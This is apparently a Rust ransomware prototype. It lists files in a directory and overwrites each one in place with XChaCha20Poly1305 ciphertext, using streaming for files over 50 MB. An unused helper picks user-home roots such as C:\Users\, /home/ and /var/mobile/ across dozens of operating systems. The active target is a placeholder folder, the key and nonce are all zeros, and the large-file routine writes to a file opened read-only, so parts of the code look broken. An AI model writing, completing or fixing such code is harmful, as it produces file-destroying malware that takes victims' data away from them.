use std::fs;
use std::fs::File;
use std::io::{Write, Read};

use chacha20poly1305::XChaCha20Poly1305;
use chacha20poly1305::aead::NewAead;
use chacha20poly1305::aead::Aead;
use chacha20poly1305::aead::stream;


fn main() {
    let path = "/home/folder_never_used"; //detect_os_path();
    let key = [0u8; 32];
    let nonce = [0u8; 24];

    let result = fs::read_dir(path);
    if result.is_err() {
        return;
    }

    let result = result.unwrap();
    for entry in result {
        let entry = entry.unwrap();
        let file_path = entry.path();
        let file_path = file_path.to_str();
        if file_path.is_none() {
            continue;
        }

        let file_path = file_path.unwrap();
        let file_name = entry.file_name();
        let file_name = file_name.to_str();
        if file_name.is_none() {
            continue;
        }

        let file_size = fs::metadata(file_path);
        if file_size.is_err() {
            continue;
        }

        let file_metadata = file_size.unwrap();
        let file_size_bytes = file_metadata.len();
        let file_size_mb = file_size_bytes as f64 / 1024.0 / 1024.0;

        if file_size_mb < 50.0 {
            encrypt_small_file(file_path, &key, &nonce);
        } else {
            encrypt_large_file(file_path, &key, &nonce);
        }
    }
}

fn detect_os_path() -> String {
    let os = std::env::consts::OS;
    match os {
        "windows" => {
            return String::from("C:\\Users\\");
        }
        "linux" => {
            return String::from("/home/");
        }
        "macos" => {
            return String::from("/Users/");
        }
        "android" => {
            return String::from("/data/data/");
        }
        "ios" => {
            return String::from("/var/mobile/");
        }
        "freebsd" => {
            return String::from("/home/");
        }
        "openbsd" => {
            return String::from("/home/");
        }
        "netbsd" => {
            return String::from("/home/");
        }
        "dragonfly" => {
            return String::from("/home/");
        }
        "haiku" => {
            return String::from("/home/");
        }
        "solaris" => {
            return String::from("/home/");
        }
        "illumos" => {
            return String::from("/home/");
        }
        "cloudabi" => {
            return String::from("/home/");
        }
        "fuchsia" => {
            return String::from("/home/");
        }
        "redox" => {
            return String::from("/home/");
        }
        "vxworks" => {
            return String::from("/home/");
        }
        "wasi" => {
            return String::from("/home/");
        }
        "emscripten" => {
            return String::from("/home/");
        }
        "hermit" => {
            return String::from("/home/");
        }
        "l4re" => {
            return String::from("/home/");
        }
        "sgx" => {
            return String::from("/home/");
        }
        "wasm32" => {
            return String::from("/home/");
        }
        "raspberry" => {
            return String::from("/home/");
        }
        "unknown" => {
            return String::from("/home/");
        }
        _ => {
            return String::from("/");
        }
    }
}

fn encrypt_small_file(path: &str, key: &[u8; 32], nonce: &[u8; 24]) {
    let cipher = XChaCha20Poly1305::new(key.into());
    let file_data = fs::read(path);
    match file_data {
        Ok(data) => {
            let encrypted_file = cipher.encrypt(nonce.into(), data.as_ref());
            if encrypted_file.is_err() {
                return;
            }

            fs::write(&path, encrypted_file.unwrap()).unwrap_or_default();
        }
        Err(_) => {
            return;
        }
    }
}

fn encrypt_large_file(
    source_file_path: &str,
    key: &[u8; 32],
    nonce: &[u8; 24],
) {
    let aead = XChaCha20Poly1305::new(key.as_ref().into());
    let mut stream_encryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    const BUFFER_LEN: usize = 500;
    let mut buffer = [0u8; BUFFER_LEN];

    let source_file = File::open(source_file_path);
    if source_file.is_err() {
        return;
    }

    let mut source_file = source_file.unwrap();

    loop {
        let read_count = source_file.read(&mut buffer);
        if read_count.is_err() {
            return;
        }

        let read_count = read_count.unwrap();

        if read_count == BUFFER_LEN {
            let ciphertext = stream_encryptor.encrypt_next(buffer.as_slice());
            if ciphertext.is_err() {
                continue;
            }

            let ciphertext = ciphertext.unwrap();

            let result = source_file.write(&ciphertext);
            if result.is_err() {
                continue;
            }
        } else {
            let ciphertext = stream_encryptor.encrypt_last(&buffer[..read_count]);
            if ciphertext.is_err() {
                return;
            }

            let ciphertext = ciphertext.unwrap();

            source_file.write(&ciphertext).unwrap_or_default();
            break;
        }
    }
}